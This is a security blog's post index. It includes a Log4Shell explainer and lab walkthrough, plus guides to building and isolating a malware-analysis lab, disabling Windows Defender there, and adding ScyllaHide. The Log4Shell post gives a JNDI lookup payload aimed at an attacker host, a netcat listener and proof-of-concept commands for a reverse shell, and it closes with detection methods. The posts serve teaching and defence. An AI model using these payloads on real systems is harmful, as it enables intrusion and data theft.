[ { "title": "Log4Shell - What is it, How does it Work &amp; How to Detect it", "url": "/posts/log4shell_what_is_it_how_does_it_work_how_to_detect_it-copy/", "categories": "Exploit Research, Vulnerabilities", "tags": "log4shell, malware, exploit, vulnerabilities", "date": "2022-02-19 07:00:00 -0500", "snippet": "Introduction:In this write up I will be discussing what Log4J is, what CVEs are out there now, how the Log4Shell vulnerability works and how to detect the activity.  The goal of this write up is to share valuable info on how Log4Shell works and why it was so severe.CVEs Published: Vulnerability: Details: Vulnerable Versions: Patched? CVE-2021-45105 (latest) Left the door open for an attacker to initiate a denial-of-service attack by causing an infinite recursion loop on self-referential lookups. Log4j2 versions 2.0-alpha1 through 2.16.0 (excluding 2.12.3 and 2.3.1) This issue was fixed in Log4j 2.17.0, 2.12.3, and 2.3.1. CVE-2021-45046 (second) Could allow attackers to craft malicious input data that could cause an information leak or remote code execution. Log4j 2.15.0 Log4j 2.16.0 (Java 8) and 2.12.2 (Java 7) fix this issue by removing support for message lookup patterns and disabling JNDI functionality by default. CVE-2021-44228 (original) Possible for an attacker to execute random code using the message lookup functionality. Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. What is Log4j:Log4j 2 is a Java-based logging framework and utility that is used to log messages from various software and search for errors.  The log4j library can also execute commands to generate advanced logging information.  Most importantly, to Log4Shell, it can also communicate with other sources such as internal and external directory services using the Java Naming and Directory Interface or JNDI.What is LDAP and JNDI:LDAP (Lightweight Directory Access Protocol) is an open and cross-platform protocol that is used for directory service authentication. It provides the communication language that the application uses to communicate with other directory services. These directory services store various types of important information like user accounts details, passwords, computer accounts, etc which are shared with other devices on the network.JNDI (Java Naming and Directory Interface) is an application programming interface (API) that provides naming and directory functionality to applications written using Java Programming Language.Figure 1: JNDI DiagramHow does JNDI and LDAP Interact:JNDI provides a standard API for interacting with name and directory services using a service provider interface (SPI) as shown in the diagram above. JNDI provides Java applications and objects with an interface to access directory services like LDAP. More information can be found on Oracle’s JNDI Implementor Guidelines for LDAP Service Providers.Log4Shell(CVE-2021-44228):Log4Shell is an RCE (remote code execution) vulnerability meaning that the vulnerability allows an attacker to execute code remotely on a target system.  This is possible due to the Log4j 2 library being able to communicate with external sources. An attacker can easily send malicious commands to a server running a vulnerable version of Log4j 2,  which can be used to remotely upload malicious payloads to the server.More specifically, Log4Shell targets Log4j 2’s Java Naming and Directory Interface or JNDI API. In vulnerable versions of Log4j 2, the JNDI API does not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP or Lightweight Directory Access Protocol servers when message lookup substitution is enabled.Normal Log4j Lookup:Log4j provides the ability to perform various kinds of lookups. Lookups allow a Java application to add values to the log4j configuration at various places.  These lookups can include mapping, system properties, and most importantly to Log4Shell, JNDI lookups.As seen in Figure 1, Log4j uses the JNDI API to interact with various naming and directory services such as: LDAP, DNS(Domain Name Service), NIS (Network Information Service), etc. If this functionality is being used you should see this line of code somewhere: ${jndi:logging/context-name}. “:logging” specifies that the logging protocol is being targeted by JNDI, but other protocols (such as LDAP, RMI, DNS, etc) can be substituted as seen later in this document.  Below is a diagram of a normal Log4j Lookup.Figure 2: Normal Log4J RequestMalicious Log4j Lookup:An attacker who can control log messages or log messages parameters can execute arbitrary code on the vulnerable server loaded from LDAP servers when message lookup substitution is enabled. As a result, an attacker can craft a special request that would make the utility remotely downloaded and execute the payload.Below is the most common example of it using the combination of JNDI and LDAP: ${jndi:ldap://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/&amp;lt;payload&amp;gt;}Figure 3: Malicious Log4j RequestLog4Shell Exploitation:There are several Log4Shell POCs on GitHub now. For this particular example, we will be using Kozmer’s POC. The setup is pretty straightforward. Requirements will be a laptop or Macbook with some type of virtualization software installed, one Kali VM, and one Ubuntu VM with Docker installed.Setting up Vulnerable Log4j 2 Enabled Server:Log into your Ubuntu VM and clone the Log4Shell POC:git clone https://github.com/kozmer/log4j-shell-poc.gitOnce you download the POC, Navigate into the folder using:cd log4j-shell-pocNext, run:pip install -r requirements.txt This installs all the necessary packages needed for the python script to run successfully.Now we can build the vulnerable server with Docker:docker build -t log4j-shell-pocdocker run --network host log4j-shell-pocYou may need to run sudo in front of both commands depending on the level or permissions your default ubuntu account has. If successful you should see this by navigating to localhost:8080 in the web browser:Figure 4: Testing to see if Ubuntu Server is UpSetting up the Attacker Server(Kali VM):To start out, let’s switch to root:sudo suNow we need to download the same POC from GitHub.git clone https://github.com/kozmer/log4j-shell-poc.gitNext, we need to download the correct Java version to our Kali VM to successfully exploit the vulnerability. To do that, navigate to: https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.htmlAnd download one of the earlier version of Java 8: java-8u20To download the java version you will need to create an account with Oracle.  Once you download the Java version, we need to unzip the file and move the jdk1.8.0_202 file into the usr/bin/ directory.Figure 5: Moving Java Library to Folder of InterestNow that we have done that, we need to navigate to the log4j-shell-poc folder located wherever you unzipped it to.cd {path-to-log4j-shell-poc}Next, edit the poc.py file stored in that folder. Open the file withgedit poc.py and change each section that contains ./jdk1.8.2.20/ to /usr/bin/jdk1.8.0_202/ there should be 3 spots where this needs to be changed. &amp;gt; Note: if you don’t have gedit installed, Kali will prompt you to install, you can just hit Y to do so.Figure 6: Editing POC.py fileIf done successfully, your file should look like this:Figure 7: What POC.py file should look likeWe are now ready to start the attack on the vulnerable Ubuntu server.  First things first, navigate to the Ubuntu machine IP on port 8080 in a browser:Figure *: Checking to see if we can access Ubuntu server from Kali VMNext in a new terminal tab on Kali, start a netcat listening session: nc -lvp 9001Figure 9: Starting netcat listenerThen in the original terminal session(In the log4j-shell-poc folder), type:python poc.py --user_ip {ip_of_kali_vm} --webport 8000 --lport 9001Figure 10: Starting log4shell POC scriptNow that we have our attacker LDAP server up and running, we can now input our malicious JNDI query into the web server which was provided when we ran the python command above. Look for the JNDI query next to ‘Send me’:Figure 11: Inputing Malicious JNDI queryYou should now see this in our POC script terminal session:Figure 12: Showing POC script running successfullyIn figure 12, we can see that the exploit was successful. The vulnerable web server queried our malicious LDAP server which then served the malicious Exploit.class file. Within this .class file is a reverse shell payload that will attempt to connect to our netcat listener.Figure 13: Showing Reverse Shell via netcat ListenerNow that we have a reverse shell on the victim web server we can download additional payloads, exile data, do whatever we want on the system.Figure 14: Showing Ability to Download Files from InternetI’ve also recorded the session to show what it looks like in real time: If you want, you can craft custom payloads to be delivered via this POC and play around with the Log4Shell vulnerability. It’s extremely powerful and there is a lot of different ways to leverage it against a target system.How to Detect this Activity:Given the severity of this vulnerability, leveraging high fidelity ways of detecting the activity is critical to stopping a potential attack before anything malicious is able to hit a system.  There are two higher fidelity ways to detect this kind of activity: Detecting the first step of the exploit, use of ${JNDI: in any incoming field of a packet header or web application form (e.g. username/password fields).  This can be difficult given the level of obfuscation employed by some current botnet campaigns.  Example: ${lower(J)n+lower(D)i Detecting the second step of the exploit, when the victim machine attempts to download and execute a Java .class file from the attacker’s server. This should be able to be seen both in proxy logs and endpoint detections. The file may or may not be openly named with the .class extension.Suricata:We can use open source IDS/IPS rulesets to see what rules fire when we replay traffic through a tool such as Security Onion.  In the screenshot below, I uploaded a PCAP I capture of attacking our victim Ubuntu machine.  Below, we can see several rules that fire based off of this activity.Figure 15: Security Onion Screenshot showing Suricata rules triggered by POCWiresharkIn the same vein, when we take a look at the raw PCAP data in our Wireshark session we can follow the TCP stream and see the malicious Log4Shell attempt in the uname field highlighted below:Figure 16: Showing PCAP in WiresharkNetworkMiner:Lastly, another great tool that you can leverage to examine potential attacking/malicious PCAP traffic is NetworkMiner.  NetworkMiner is great at parsing out data of interest in a PCAP capture that you can quickly identify.  In the screenshots below, I have the attack data of interest highlighted.  We can see the JNDI query in the uname field again, just like in Wireshark. In addition to that, we can also see the subsequent wget command I used in the video to pull the index.html file of Google main page. In an actual successful attack, you would likely see some kind of attempt to download an additional payload to the server.  Wget is probably the most common way to do so and is also pre-installed on most Linux distros.  Because of this an attacker can be “living off the land” when performing the initial compromise of a device.  This is because you might see legit usage of wget to install/update legitimate packages.Figure 17: Showing NetworkMiner CaptureFinal Thoughts:Hopefully you found this walkthrough useful. There are various other things that you can do with Log4Shell as well. There is a POC from CyberReason that using the same vulnerability to “vaccinate” a server from the same attack. I’ll probably create a short walkthrough highlighting that as well in a later post. But if you are interested, definitely check it out: Logout4Shell.You might also way to see what attacks are happening in the wild. A great way to do that is using a HoneyPot. Thomas Spatzke’s Log4Pot is awesome for this. You could also install T-Pot which also has Log4Pot included in one of the deployments.Figure 18: Log4Pot DashboardYou can follow me on Twitter where I’ll be sharing when I upload new posts." }, { "title": "Disabling Windows Defender for Your Malware Analysis Lab", "url": "/posts/disabling_windows_defender_for_malware_analysis_lab/", "categories": "Malware Analysis Series, How to", "tags": "windows_defender, malware, malware_analysis, windows", "date": "2022-01-29 07:00:00 -0500", "snippet": "Introduction:When it comes to malware analysis and reverse engineering, in most cases, you will want to have your AV and security tools disabled. The main reason for this is so your AV doesn’t accidentally delete and/or block a sample when you are trying to work on them.In this short post we will go through some steps to disable Windows Defender on our analysis VM.Editing Virus &amp;amp; Threat Protection Settings:The first thing we should do is open up the Windows Security app on our Windows 10 VM.Start –&amp;gt; Type Windows Security –&amp;gt; Open App –&amp;gt; select Virus &amp;amp; threat protection tab –&amp;gt; click Manage Settings under Virus &amp;amp; threat protection settingsOnce we are in the settings page, turn off Real-time protection, Cloud-delivered protection, Automatic sample submission, &amp;amp; Tamper Protection.By turning all of these settings off, Windows Security will not constantly eat and/or stop samples from running on you analysis machine.Another step we should take just in case Windows Defender turns itself back on after a reboot is we can add our C:\\ drive to the exclusion list so that Windows Security will ignore any files there. To do that just scroll down to bottom of the same page and you should see Exclusions.Click Add or remove exclusions –&amp;gt; + Add an exclusion –&amp;gt; select folder –&amp;gt; type C:\\ –&amp;gt; click Select FolderAfter doing this you should see the C drive added under the + Add an exclusion button.Permanently Disabling Windows Defender via Group Policies:Another way we can permanently disable Windows Defender is by editing our Group Policies. For those of you using a Developer image from Microsoft, you may or may not be able to edit the Group Policies. If you can’t disable via group policies, the steps above will do the trick. Just make sure to take a snapshot of your VM after doing this so you don’t accidentally have to do this all over again.Now to edit our Windows Defender group policy we need to:Hit Start –&amp;gt; type gpedit.msc –&amp;gt; Open Group Policy Editor –&amp;gt; Navigate to Computer Configuration –&amp;gt; Administrative Templates –&amp;gt; Windows Components –&amp;gt; Microsoft Defender Antivirus –&amp;gt; Double Click Turn off Microsoft Defender AntivirusIt should look like this:You should now be presented with the Turn off Microsoft Defender Antivirus policy window. In this window we need to:Select Enabled –&amp;gt; Click Apply –&amp;gt; Click OKIf you want, you can also type a comment to explain what you are doing but it’s not a requirement.Once you hit Apply &amp;amp; OK the window will disappear. You should now see the same policy with the State field labelled Enabled.Final Thoughts:If you are able, permanently disabling Windows Defender makes it so much easier to examine various samples while doing your work. There have been several times early on when I forgot to do this on a new analysis VM and Defender would quarantine and delete my sample.I’m working on several different things at the moment including a Log4Shell post that goes about setting up an environment to see the vulnerability in action. As well as writing another quick post on permanently disabling ASLR on your Windows analysis machine. So if you are interested in either of these things, definitely follow me on Twitter where I’ll be sharing when I upload new posts." }, { "title": "Adding ScyllaHide Plugin to x32/64DBG", "url": "/posts/adding_scyllahide_plugin_to_x32_x64dbg/", "categories": "Malware Analysis Series, How to", "tags": "x32/64dbg, malware, malware_analysis, scyllahide", "date": "2021-11-20 07:00:00 -0500", "snippet": "Introduction:Today I wanted to quickly detail how you can add the ScyllaHide plugin into your x32/64dbg tools. ScyllaHide is an open source plugin that can help to hide your debugger from common anti-debugging techniques that a lot of malware leverage.Downloading the latest ScyllaHide 7zip file:You can download the latest release of ScyllaHide here. You can download the source code if you prefer however, it is easiest if you download the 7zip file.Extracting the ScyllaHide files:After downloading the files, extract them to the Desktop or whatever location you prefer. 7zip can extract all of the contents of the 7zip file to a parent folder in that location and that is the option I like to go with:Finding the Plugin in Files:The next step is to find the appropriate files that need to be moved into both x32 and x64dbg plugins folder.ScyllaHide_folder –&amp;gt; x64dbg–&amp;gt; x32 or x64 (depending on which version of plugin files you are looking for) –&amp;gt; PluginsFinding x32/64dbg Plugin Folder Location:The easiest way to find out you x32/64dbg plugin in folder path is by:Open x32/64dbg –&amp;gt; Options –&amp;gt; Import settingFrom here, double click the plugins folder then at the top you can click into the file path and copy the file path to your clipboard:Moving ScyllaHide Files to x32/64dbg Plugin Folder:Now that we have copied the file path to our x32/64dbg plugin folder we can open up our SyllaHide folder on our desktop. Using the same file path as before:ScyllaHide_folder –&amp;gt; x64dbg–&amp;gt; x32 or x64 (depending on which version of plugin files you are looking for) –&amp;gt; PluginsYou should now be here:Highlight all three files and then click Move To button in the tool bar above:Move To –&amp;gt; Choose location...Once you have clicked on Choose location... paste in the file path to our x32/64dbg plugin file location we grabbed in the last section:Lastly, click move and Windows will then move those files into the plugins folder. It’s important to note that you need all three files move into the plugins folder.In our particular case we started with x32dbg first, you need to complete the same steps for x64dbg to have ScyllaHide plugin added to your x64dbg debugger as well.Checking to See if Plugin Install Successfully:To check to see if the plugin was installed successfully all we have to do is open up x32 or x64dbg. In the tool bar you should see a Plugins tab. When you click that, you should now see ScyllaHide as one of the plugins.Final Thoughts:ScyllaHide is an extremely useful module for bypassing Anti-debugging techniques leveraged by malware today. It’s great to implement when you want to focus on what the malware is doing vs trying to defeat all of the various anti-debugging techniques that might be present.Hopefully you found this post helpful in some way. If you have any questions, comments or just want to chat you can find me on Twitter." }, { "title": "Malware Analysis Series - Part 2, How to Isolate our Homelab with Network Segmentation", "url": "/posts/how_to_isolate_homelab/", "categories": "Malware Analysis Series, How to", "tags": "firewalla_gold, unifi, malware, malware_analysis", "date": "2021-10-10 08:00:00 -0400", "snippet": "Introduction:In part one of this series, we established a solid foundation to begin our malware analysis journey. We successfully stood up two VMs; a Windows(FLARE) machine and a Linux(REMnux) machine. Put them on their own isolated virtual network without access to the internet. Lastly, we configured FLARE to use REMnux as its Gateway and DNS so that we could monitor its network communications. We tested this by setting up INetSim on REMnux and trying to connect to a “malicious” site on our FLARE VM.In part 2, we will be looking at isolating our home lab machine from the rest of our network through network segmentation. Network segmentation is a critical component of secure network architecture. It is a way of dividing a network into various segments, usually referred as subnets, that act as their own smaller network. This offers several benefits including better control over the flow of traffic between different subnets through the use of policies which enhances security. Businesses and enterprises have used network segmentation for years but can be just as beneficial to home networks. These benefits can extend way beyond our malware analysis series as well.Why is network segmentation important for malware analysis?You might be thinking, “Why do I need network segmentation when I already have my VMs on an isolated VM network?”. The honest answer is you don’t. You can still use the setup we created in part 1 to analyze all kinds of malicious samples and be adequately protected from them. However, it isn’t good practice to have your home lab machine and VMs on the same network and able to communicate with the rest of your devices. There are several reasons for this: You will need to get your file samples from somewhere and normally you will be grabbing samples from public repositories like VirusTotal. Doing so on a machine that shares the same network as the rest of your devices puts them at risk of infection if you accidentally detonate the file on your physical machine. In some instances you might want to provide your malware sample with a live internet connection. Possibly as a way of getting a secondary file from a downloader you’re analyzing. If your home lab machine is on the same network it opens up possible routes for the malware to spread itself. In extremely rare cases, malware might be able to exploit a vulnerability and ‘escape’ the VM. If this happens, the malware could infect your actual machine and possibly the rest of your network. Before we get started:Not all networking devices are created equal. Many home users will have all-in-one router/switch/access point combos. Netgear’s Nighthawk series is a popular example. These devices do tend to be limited in the configurability of your network. Most allow for the creation of a separate guest network that is ‘isolated’ from the regular network. If your particular device doesn’t offer VLAN or subnetting capabilities, and you don’t want to spend money on other devices, putting your home lab on your ‘guest network’ is your best option.I’ll be doing a walkthrough using the network appliances I have below. For those that have these, should be straightforward to follow along. For those who have different appliances the concept is still the same: Setup a Home Lab VLAN on your router. Assign the VLAN to the proper ports on your router and/or switches so that it can either reach your hardwired lab or your access point so you can create a home lab wifi network. Configure some basic firewall rules to block traffic between your home lab and your other internal networks.Make sure to read up on the documentation for your particular devices. They should have instructions to perform these tasks if the capablities are present.My setup:First and foremost, I am not affiliated with any of the devices or companies I am about to share. However, I am a fan of these products and would recommend them to those looking to do similar things. Firewall/Router: Firewalla Gold Switches: Ubiquiti US-8 Unifi Switch and UniFi Switch 8 US-8-60W 8-Port Fully Managed Gigabit Switch 802.3af PoE Ports(If you only need one, definitely go with the PoE capable switch little more pricey but totally worth it) Access Point: Unifi Ap-AC LiteWhat my network looks like:Setting up VLANs on my Firewalla Gold(router/firewall):Firewalla’s iPhone app makes this part very easy. In the app, selectNetwork → Edit → Create Network → Local NetworkType in the name for the VLAN, I am going with Homelab . Change Type to VLAN . Then make sure to add the VLAN ID. Based off of my network diagram above, I’ll select 30 . Now make sure to check the right ethernet port on your router so that it can actually reach your internal network. Mine uses the 3rd port on my router. After that, make sure that your IP address range and subnet mask is what you want. To make things easier for myself I tend to make the third set of two bits the same number as my VLAN ID so in my case I’ll change my IP address to 192.168.30.1 and I’ll leave the subnet mask as is.Now we can click Done at the top right and then make sure to hit Save on the Network Manager screen so that Firewalla Gold saves all the configurations you set up.Creating Homelab Network on my Unifi Equipment:Log into your Unifi Cloud Key or the VM that is hosting your Cloud Key software. If you have Cloud log in enabled you can do this through the cloud login portal. If not, then type in the IP address of the VM or Cloud Key and log in that way.Once you’re logged on, click the Gear Icon at the bottom left of the navigation panel. Select Networks and Add New Network . Create the name you want for your Network . I will continue to us Homelab as the name of the network. Click the Advanced tab. Change the VLAN ID to the number you set. For me that is 30 .This next step is very important and depends on the setup you have. My Firewalla Gold provides DHCP, so I will set mine to None . If you have a non-Unifi router that provides DHCP to your network then you will likely need to do the same. If you are using a Unifi Gateway like their USG line then I would refer you to their instructions to make sure nothing gets broken.Click Add Network . Once on the Networks main page, you might notice a subnet range that does not match what you set up in the last section. You can ignore that, it isn’t correct and when you actually join your home lab it will have an IP assigned by your Firewalla Gold that is in the subnet of your home lab.For my setup, I want to have a wireless home lab network. To set this up, I’ll select the WiFi tab in the same settings menu. Create the name of your wireless network. I’m keeping the same trend as before, Home Lab Network (boring I know). Create a unique password for your home lab network. Lastly, make sure to select the newly created Network that we created just before this. The network name I created is called Homelab . The last thing I like to do before clicking Add WiFi Network is click Advanced → Security → check Hide WiFi Name . I like to hide the SSID of my Home Lab network just so it doesn’t show up when people are actively looking for WiFi networks to join.After hitting Add WiFi Network you should now see your newly created WiFi network in the list of current WiFi networks.Configuring Firewall Rule to Block Traffic between Internal Networks:Now that we have our newly created home lab network up and running, we should create some firewall rules to make sure we properly isolate our home lab network from the rest of our internally created networks. To do this, we need to jump back into our Firewalla Gold app.From the app select Rules → Add Rule . For the action, I’ll select Block . In the Matching section we have two fields we need to configure. First, we need to set a target: select Local Network → All Local Networks → Traffic from &amp;amp; to All Local Networks . Now we need to select which device this rule will apply to. Click the Select field and select your Homelab network. The schedule I will keep always and I’ll add a quick note to the rule Isolating Homelab network from all other internal networks . Hit Save and you should now see another rule in the list specifically for your home lab.Thats all that I need to do to create a homelab wifi network and properly isolate it from the rest of my internal networks. Firewalla Gold makes this process extremely easy and is probably different from how other devices create VLANs and firewall rules. If you run into trouble with your device, check out forums for assistance. I’ve found Reddit extremely helpful for finding help. Especially if you join that device’s specific subreddit.Final Thoughts:The network appliances that you have at home might be vastly different from the ones I have. You might even only have that Netgear Nighthawk router and thats ok. It is an investment to grab some of the equipment I have in this post and is something I bought over a number of months. It might not even be something that you want to invest in and thats ok too. Most of these all-in-one routers have the ‘Guest Network’ feature that can be easily turned on and sufficiently blocks the Guest Network from accessing the rest of your devices. Thats really all that is needed.If you are someone trying to get into networking and understanding firewall rules, investing in this type of gear can be extremely beneficial for you. I myself tend to learn the best when I build things and set things up on my own vs watching videos or reading a book about it.Hopefully you found this post helpful in some way. If you have any questions, comments or just want to chat you can find me on Twitter." }, { "title": "Malware Analysis Series - Part 1, Setting Up a Basic Malware Analysis Virtual Lab", "url": "/posts/how_to_set_up_homelab_blog/", "categories": "Malware Analysis Series, How to", "tags": "vmware, malware, malware_analysis, remnux, flare", "date": "2021-08-01 08:00:00 -0400", "snippet": "Introduction:Since joining the Cyber Security and Intelligence community in 2016, I’ve always had a strong interest in malware analysis. The process of breaking something down, looking at its individual parts, testing hypotheses as to what its capabilities are. This is something that has always drawn me to the field. Its also a field that is extremely new to me. I’ve only just started to learn how to setup a proper lab and all the various techniques that exist to breakdown and understand malware. Because of that, I wanted to start a blog series to document my process for others, in hopes that my journey will make it easier for anyone trying to get started in the field.What to Expect from this Post:My aim for this post, and ideally for a continued series, is to provide a simple straight forward approach to setting up a malware analysis lab. The best part is that nearly all the tools I will be using are open source or have an open source alternative, meaning there isn’t any cost to get started. Only expense will be a physical machine to host several VMs at one time. I’m hoping this will help out others, while also reinforcing old concepts and learning new ones for myself.Before We Start: I will be using VMware Fusion Pro for this walkthrough. I have had the best experience by far with VMWare’s line of virtualization software. However, VirtualBox can be a great, free, substitute for VMWare. Troubleshooting the installation of virtualization software and/or the individual VMs is out-of-scope for this post. There are just too many things that might go wrong. If you do run into trouble, Google is your best friend. When you run multiple virtual machines(VMs) on a single host machine, the host machine will slow down. Because of this, it is important to give each VM its recommended settings for optimal performance. For Windows 10, I recommend at least 2 processor cores and 4GBs of RAM. For REMnux, 1 processor cores and 2GBs of RAM.Pre-requisites VMWare Fusion(MAC)/ Workstation(Windows/Linux): VMWare has some great, comprehensive guides to install both Fusion and Workstation. VMWare does offer trial licenses for those interested in trying out the full feature set VMWare Pro line(Fusion Pro and Workstation Pro). VMware also has its Player line, which is free for personal use. Only downside is that the Player version doesn’t allow network customization that you should use for your lab. Additionally, only Fusion Player has the ability to take snapshots. Which is the major difference between Workstation Player and Fusion Player. Hopefully VMware fixes that in the future. VirtualBox: Is the free alternative to VMware and some of the other virtualization software out there. It also has all the feature you need in a VM solution starting out. You can get a copy of VirtualBox here. Windows Edge Developer ISO: You can download a Windows ISO file: here. We will be doing this later in the post. FLARE VM: FLARE VM is free malware analysis VM with a ton of tools and features pre-installed by FireEye. Its a great addition to your malware analysis toolset. You can find instructions to install it here. REMnux: REMnux is a powerful Linux VM that has a great collection of tools for Malware Analysis by Lenny Zeltzer here. You can find a lot of helpful reasources on his site including REMnux and reversing cheatsheets as well as blog posts that you might find useful.Downloading Virtualization Software:Using the links above, navigate to your preferred virtualization software site. Follow the instructions provided by each vendor. Installation shouldn’t take too long and might ask for certain permissions it needs to modify network settings and such. After you get it installed jump to the next section.Configuring your Network Settings:First thing we should do is set up our isolated custom network we will be using for our lab. Being able to control how the network interacts with a malware sample is extremely important for analysis. You also don’t want the malware sample to have access to the Internet(at least at first) until you have a decent understanding of what the malware is trying to do. In VMware Fusion, it is pretty straight forward and easy to do. Select the tab VMware Fusion -&amp;gt; Preferences -&amp;gt; Network. Click the lock icon at the bottom left side to make changes. Hit the + button just above the lock icon. You should see a new network call vmnet# mine is vmnet2 but yours could be a different number. Highlight that then uncheck the radio button labeled allow virtual machines on network to connect to external networks(using NAT) Configure your subnet IP. I want an IP subnet that will stand out when I see it. So I went with 10.1.1.0. Keep the Subnet Mask as is. Then click Apply.Installing Virtual Machines:Downloading a Windows 10 Edge Developer image:Now that you have virtualization software installed, we need to get a Win 10 developer image from Microsoft. This Win 10 image will serve as the base image. FLARE can only be install on an already existing physical or virtual Windows machine. Using the link above, select the MSEdge on Win10 (x64) {Some_Stable_Version}. Then select the VM platform you have, in this case I will select VMware (Windows, Mac). The download is several GBs so depending on your download speed, it could take some time. Please note the password for the VM: “Passw0rd!” with a zero.Installing and Setting up Windows 10 Machine in VMWare Fusion:Lets unzip the file and store it in a location of your choice. Open up VMware’s Virtual Machine Library and follow these steps: Unzip the MSEdge-Win10-VMware file, if not automatically done by your host machine. You can store the unzipped contents anywhere. I’m going to put them on my Desktop. Click File -&amp;gt; Import -&amp;gt; Choose File -&amp;gt; MSEdge-Win10-VMWare.ovf -&amp;gt; Continue -&amp;gt; Save. You can change the name and location of where the VM is stored if you would like. Click Customize Settings after the image has been imported successfully. Navigate to Processors &amp;amp; Memory. Confirm that the VM is allocated 2 processor cores and 4Gbs of RAM(4096MBs). Before we power on the Windows 10 machine for the first time, we should take a snapshot. Name it something like Fresh Win10 Install. Microsoft states that the image expires after 90 days so this could cause problems with your FLARE VM in the future. By taking a snapshot before you start the VM, that snapshot will not start the expiration timer until it is booted up for the first time. When you start the machine, if VMWare prompts you to upgrade, click Upgrade. The VM should activate itself after a few minutes but we can do it manually. Open a command prompt and type: slmgr.vbs /ato VMWare should prompt you to install VMware’s Virtual Tools. Install the tools and then reboot the machine. The VM might reboot twice, once for settings updates and another time to successfully install VMware’s Virtual Tools. After the machine logs in successfully after installing VM Virtual Tools. Take another snapshot and name it something to the effect of, Win 10 Activated with VM Tools installed.One thing to note, snapshots are a must when working with malware. The ability to revert back to a clean state after performing some behavior analysis on one file is very powerful and time saving. It allows you to test other hypotheses or another file in a clean environment before infection. It also saves time so you don’t have to rebuild a whole new VM from scratch because you don’t have a clean starting image.VirtualBox Users:VirtualBox tends to require more manual configuration to get your VMs to work properly. One thing I always look at is the Invalid Setting notification(shown below) that appears at the bottom of the individul VMs settings window. These settings errors are normally pretty straight forward and easy to address in the setting menu.Last thing that tends to be more complicated in VirtualBox is installing VB Guest Additions. I recommend following the instructions VirtualBox has on their manual page here Section 4.2.1.1. Installing the Windows Guest Additions. Sometimes, you will get an error that you can’t attach the guest additions due to no optical drive. If thats the case, you need to use the mount Guest Additions manually steps.Install FLARE on your fresh install of WIN 10:Now that we have our base Win 10 machine up and running we can get FireEye’s FLARE VM installed:Optional: Install git on our Win10 box. Open up a browser on your Win10 VM and Google: Install git windows or copy and past this url: https://git-scm.com/download/win. Click the 64 bit Windows Version and keep all the settings default during installations. When it finishes with the settings, hit install then after it installs hit finish. Go to https:/github.com/fireeye/flare-vm. Download the code as a zip file. If you performed the optional step then open up a cmd prompt: cd Desktop &amp;amp;&amp;amp; git clone https://github.com/fireeye/flare-vm Else: Unzip the flare vm zip file on your Desktop Open up Powershell as an Administrator. Type Powershell in the Type here to search bar and then right click on Windows Powershell and select Run as Administrator. In the Powershell prompt, navigate to the FLARE vm folder: cd C:\\Users\\IEUser\\Desktop\\FLARE-vm Next enable unrestricted execution policy for PowerShell by executing the following command and answering “Y” when prompted by PowerShell: Set-ExecutionPolicy unrestricted Execute the install.ps1 installation script. You will be prompted to enter the current user’s password. FLARE VM needs the current user’s password to automatically login after a reboot when installing. Optionally, you can specify the current user’s password by passing the “-password ” at the command line. ./install.ps1 -password Passw0rd! The rest of the installation process is fully automated. Depending upon your internet speed the entire installation may take up to one hour to finish. The VM also reboots multiple times due to the numerous software installations’ requirements. Once the installation completes, the PowerShell prompt remains open waiting for you to hit any key before exiting. After completing the installation, you will be presented with the following desktop environment:Once the install is done, run the command to update FLARE: bash cup all After the update is finished, reboot and log back in. Then take another snapshot and name it something like Fresh install of FLARE-VM.Download and Configure REMnux:Navigate to the REMnux page link shared above and hit Download -&amp;gt; -&amp;gt; General OVA(Or VirtualBox OVA if using VirtualBox) -&amp;gt; Box -&amp;gt; Download save the file and import just like we did with the Win10 image: Unzip the file downloaded containing REMnux if not automatically done by your host machine. You can store the unzipped contents anywhere. Again, i’m going to put them on my Desktop. Click File -&amp;gt; Import -&amp;gt; Choose File -&amp;gt; remnux-v7 -&amp;gt; Continue -&amp;gt; Save. You can change the name and location of where the VM is stored if you would like. Click Customize Settings after the image has been imported successfully. Navigate to Processors &amp;amp; Memory. Confirm that the VM is allocated 1 processor cores and 2Gbs of RAM(2048MBs). Go to Settings and click Add Device -&amp;gt; Network Adapter -&amp;gt; Add -&amp;gt; Share with my Mac. When you click the Show All button you should now see two network adapters. Go to Network Adapter 1 and select vmnet# that you created in the first section. Start up REMnux, if prompted, upgrade the virtual machine like we did with our Windows 10 machine. Log in to the REMnux machine; credentials are user: remnux pass: malware. First thing we want to do is grab the IP of our machine for Network Adapter 1. Make sure to save that IP address. It should be an IP in the range we selected when we create vmnet#. In my case its 10.1.1.2: ifconfig -a Update our REMnux machine. This will update and upgrade all of the tools on Remnux to their latest version. It might take a several minutes to complete: remnux upgrade After running the upgrade command we should reboot: reboot Unattach Network Adapter 2 from the REMnux VM. When you want to update or use internet on the VM just reattach. Power off the REMnux VM and take a snapshot and name it something like Fresh install of REMnux {date}.Final Configurations and Network Testing:We need to connect our FLARE VM to the same network so that the REMnux box can run network based analysis on a sample. Power off the FLARE VM if you haven’t done so already. Open Settings -&amp;gt; Network Adapter. Change the Network Adapter to our vmnet# we set up in the first section of the post. Start up FLARE and open Control Panel -&amp;gt; Network and Internet -&amp;gt; Network and Sharing Center -&amp;gt; Change adapter settings -&amp;gt; Ethernet0 -&amp;gt; Properties -&amp;gt; Internet Protocol Version 4 (TCP/IPv4) -&amp;gt; Use the following address-&amp;gt; Use the IP of your REMnux box. It might be different than mine. IP address: 10.1.1.3 or any IP you want in this subnet. This will be the IP of our FLARE VM Subnet mask: 255.255.255.0 Default Gateway: 10.1.1.2(Our REMnux VM) Select use the following preferred DNS server addresses Preferred DNS Server: 10.1.1.2(Our REMnux VM) Alternate DNS Server: BLANK Click OkTesting our Network Setup with INetSim:Now that we have done all the networking setup in both VMs, we are going to set up a tool call INetSim. INetSim is a software suite for simulating common internet services in a lab environment, e.g. for analyzing the network behavior of unknown malware samples.Remnux already comes with INetSim pre-install. However, we need to do some minor configuration steps to make sure it functions properly. Open up /etc/inetsim/inetsim.confin a text editor: sudo nano /etc/inetsim/inetsim.conf By default, INetSim only has a few services active. However, we are going to uncomment out all the other services by removing the #: We now need to bind REMnux’s network adapter IP to INetSim. To do this scroll down a little bit in the config file until you see service_bind_address. Uncomment it out and add your REMnux IP in place of the 0.0.0.0. I would put 10.1.1.2: Right below that you should see 